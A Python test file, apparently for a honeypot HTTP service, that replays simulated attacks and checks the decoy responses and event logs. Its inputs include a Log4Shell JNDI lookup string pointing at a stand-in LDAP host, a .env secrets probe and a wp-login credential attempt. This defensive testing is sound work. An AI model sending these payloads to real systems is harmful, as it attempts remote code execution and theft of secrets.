import asyncio
import json

from sentinel.config import Config
from sentinel.events import EventLog, verify
from sentinel.http_service import start_http


def _cfg(tmp_path):
    import os
    os.environ.update(DATA_DIR=str(tmp_path), HTTP_PORT="0", BIND="127.0.0.1")
    return Config.from_env()


async def _request(port: int, raw: bytes) -> bytes:
    r, w = await asyncio.open_connection("127.0.0.1", port)
    w.write(raw)
    await w.drain()
    data = await asyncio.wait_for(r.read(), 5)
    w.close()
    return data


def _events(path):
    return [json.loads(line) for line in path.read_text().splitlines()]


def test_http_honeypot_end_to_end(tmp_path):
    cfg = _cfg(tmp_path)
    log = EventLog(cfg.log_path, "t")

    async def scenario():
        srv = await start_http(cfg, log)
        port = srv.sockets[0].getsockname()[1]
        env = await _request(port, b"GET /.env HTTP/1.1\r\nHost: x\r\nUser-Agent: zgrab\r\n\r\n")
        l4s = await _request(port, b"GET / HTTP/1.1\r\nHost: x\r\nX-Api: ${jndi:ldap://e/a}\r\n\r\n")
        body = b"log=admin&pwd=hunter2"
        login = await _request(port, b"POST /wp-login.php HTTP/1.1\r\nHost: x\r\nContent-Length: "
                               + str(len(body)).encode() + b"\r\n\r\n" + body)
        nf = await _request(port, b"GET /nothing HTTP/1.1\r\nHost: x\r\n\r\n")
        junk = await _request(port, b"\x16\x03\x01\x00garbage\r\n\r\n")  # TLS hello on plain port
        srv.close()
        return env, l4s, login, nf, junk

    env, l4s, login, nf, junk = asyncio.run(scenario())
    assert b"DB_PASS" in env and b"nginx" in env
    assert b"200" in l4s.split(b"\r\n")[0]
    assert b"incorrect" in login and b"404" in nf.split(b"\r\n")[0]
    ev = _events(cfg.log_path)
    kinds = [e["kind"] for e in ev]
    assert "login_attempt" in kinds and kinds.count("web_attack") >= 2
    cred = next(e for e in ev if e["kind"] == "login_attempt")
    assert (cred["username"], cred["password"]) == ("admin", "hunter2")
    assert any("log4shell" in e["tags"] for e in ev if e["kind"] == "web_attack")
    assert verify(cfg.log_path)[0]
